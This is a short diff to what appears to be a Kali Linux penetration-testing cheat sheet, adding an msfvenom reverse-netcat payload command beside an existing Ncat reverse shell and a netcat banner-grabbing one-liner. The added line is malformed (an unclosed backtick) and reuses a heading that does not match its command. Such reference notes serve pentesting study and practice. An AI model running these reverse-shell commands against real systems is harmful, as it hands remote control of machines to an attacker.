@@ -163,6 +163,9 @@ Kali Linux
     -   Create a reverse shell with Ncat using bash on Linux  
         `nc -nv $ip 4444 -e /bin/bash`
         
+    -   Create a reverse shell with Ncat using bash on Linux      
+        `msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.102 lport=8888 R
+        
     -   Netcat for Banner Grabbing:
     
         `echo "" | nc -nv -w1 <IP Address> <Ports>`
